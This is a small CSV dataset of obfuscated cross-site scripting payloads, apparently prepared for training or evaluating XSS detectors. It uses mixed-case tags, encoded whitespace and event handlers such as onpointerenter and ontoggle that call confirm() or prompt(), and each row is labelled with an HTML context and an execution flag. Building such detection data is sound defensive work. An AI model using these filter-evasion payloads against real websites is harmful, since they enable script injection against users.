payload,context,exec,combined
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09onPoiNTERenTeR%0a=%0a[8].find(confirm)>v3dm0s
<D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnmOUsEoVEr%09=%09[8].find(confirm)>v3dm0s
<HtML%09oNmOuseoVer+=+confirm()>,html_tag,0,CONTEXT_html_tag <HtML%09oNmOuseoVer+=+confirm()>
<hTMl%0aoNPOiNterENTEr%09=%09(prompt)``>,html_text,0,CONTEXT_html_text <hTMl%0aoNPOiNterENTEr%09=%09(prompt)``>
<A/+/OnpoiNtEreNTeR+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/OnpoiNtEreNTeR+=+confirm()%0dx>v3dm0s
<dEtAIls%0dONtOgglE+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dEtAIls%0dONtOgglE+=+(confirm)()%0dx>
<hTml/+/OnpoiNTerENter%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <hTml/+/OnpoiNTerENter%09=%09confirm()%0dx>
<D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<hTml/+/onmouseOVer+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <hTml/+/onmouseOVer+=+[8].find(confirm)>
<D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aonPOinterENTER%0d=%0dconfirm()%0dx>v3dm0s
